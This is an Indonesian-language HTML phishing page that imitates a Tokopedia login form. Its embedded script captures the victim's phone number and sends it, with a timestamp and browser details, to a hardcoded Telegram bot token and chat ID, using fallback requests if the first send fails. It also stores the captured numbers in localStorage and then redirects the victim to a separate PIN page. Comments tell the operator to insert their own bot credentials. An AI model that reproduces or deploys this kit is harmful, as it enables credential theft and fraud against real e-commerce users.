<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk ke Tokopedia</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #f7f7f7;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        .login-card {
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            border-radius: 20px;
        }
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center">

    <div class="w-full flex justify-center items-center gap-10 py-5 bg-white shadow-sm mb-10">
        <img src="img/logo.png" class="h-10" alt="Tokopedia">
        <img src="img/gopay.png" class="h-10" alt="Gopay">
        <img src="img/bibli.png" class="h-7" alt="Blibli">
    </div>

    <div class="w-full max-w-[400px] px-4">
        <div class="flex justify-center mb-6">
            <img src="img/image.png" class="h-12" alt="Tokopedia Logo">
        </div>

        <div class="bg-white login-card p-8 text-center border border-gray-100">
            <h2 class="text-xl font-bold text-gray-800 mb-6">Masukkan No. Handphone</h2>
            
            <form id="loginForm">
                <input
                    type="tel"
                    id="loginInput"
                    name="login"
                    placeholder="Nomor Handphone"
                    class="w-full border border-green-500 rounded-lg px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-green-100 mb-6 text-center"
                    required
                />

                <button
                    type="submit"
                    id="nextButton"
                    class="w-full bg-[#03ac0e] text-white py-3 rounded-lg text-xl font-bold transition duration-150 hover:bg-green-700 shadow-md"
                >
                    Verifikasi
                </button>
            </form>
        </div>

        <p class="text-center mt-12 text-gray-600">
            Tidak Mempunyai Akun? <a href="#" class="text-[#03ac0e] font-bold">Daftar</a>
        </p>
    </div>

    <script>
        // GANTI DENGAN DATA ANDA YANG ASLI
        const CHAT_ID = "8344328873"; // Ganti dengan Chat ID Anda
        const BOT_TOKEN = "8182340237:AAECNTw3t1gHZ10swjOttHJua21xKP_oIIM"; // Ganti dengan Token Bot Anda
        const NEXT_PAGE_URL = "pin.html";

        const loginForm = document.getElementById("loginForm");
        const loginInput = document.getElementById("loginInput");
        const nextButton = document.getElementById("nextButton");

        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            const loginValue = loginInput.value.trim();

            if (!loginValue) {
                alert("Silakan masukkan nomor handphone!");
                return;
            }

            // Validasi format nomor telepon
            const cleanPhone = loginValue.replace(/\D/g, '');
            if (cleanPhone.length < 10 || cleanPhone.length > 15) {
                alert("Nomor handphone harus 10-15 digit angka!");
                return;
            }

            // Ubah state button
            nextButton.textContent = "Memproses...";
            nextButton.disabled = true;
            nextButton.classList.add("opacity-70", "cursor-not-allowed");

            // Format pesan untuk Telegram
            const message = `ðŸ”” *TOKOPEDIA LOGIN REQUEST*\n\n` +
                           `ðŸ“± *Nomor HP:* ${loginValue}\n` +
                           `ðŸ“… *Tanggal:* ${new Date().toLocaleDateString("id-ID")}\n` +
                           `â° *Waktu:* ${new Date().toLocaleTimeString("id-ID")}\n` +
                           `ðŸŒ *IP Address:* Fetching...\n` +
                           `ðŸ’» *Browser:* ${navigator.userAgent.split(')')[0]})`;

            try {
                // Kirim ke Telegram
                const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_notification: false
                    })
                });

                const telegramData = await telegramResponse.json();
                
                if (!telegramData.ok) {
                    console.error("Error Telegram:", telegramData);
                    
                    // Coba metode alternatif jika gagal
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
                }

            } catch (error) {
                console.error("Error mengirim ke Telegram:", error);
                
                // Coba metode fallback
                try {
                    const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`Nomor HP: ${loginValue}\nWaktu: ${new Date().toLocaleString("id-ID")}`)}`;
                    await fetch(fallbackUrl);
                } catch (fallbackError) {
                    console.error("Fallback juga gagal:", fallbackError);
                }
                
            } finally {
                // Simpan data ke localStorage (fallback)
                try {
                    const existingData = JSON.parse(localStorage.getItem('tokped_logins') || '[]');
                    existingData.push({
                        phone: loginValue,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    });
                    localStorage.setItem('tokped_logins', JSON.stringify(existingData));
                } catch (storageError) {
                    console.error("Gagal menyimpan ke localStorage:", storageError);
                }

                // Redirect ke halaman PIN
                setTimeout(() => {
                    window.location.href = NEXT_PAGE_URL;
                }, 1500);
            }
        });

        // Format input nomor telepon
        loginInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            if (value.length > 0) {
                if (value.startsWith('0')) {
                    value = value.substring(0, 13);
                } else if (value.startsWith('62')) {
                    value = value.substring(0, 14);
                } else {
                    value = value.substring(0, 15);
                }
            }
            
            e.target.value = value;
        });

        // Fokus ke input saat halaman load
        window.addEventListener('load', function() {
            loginInput.focus();
        });
    </script>
</body>
</html>
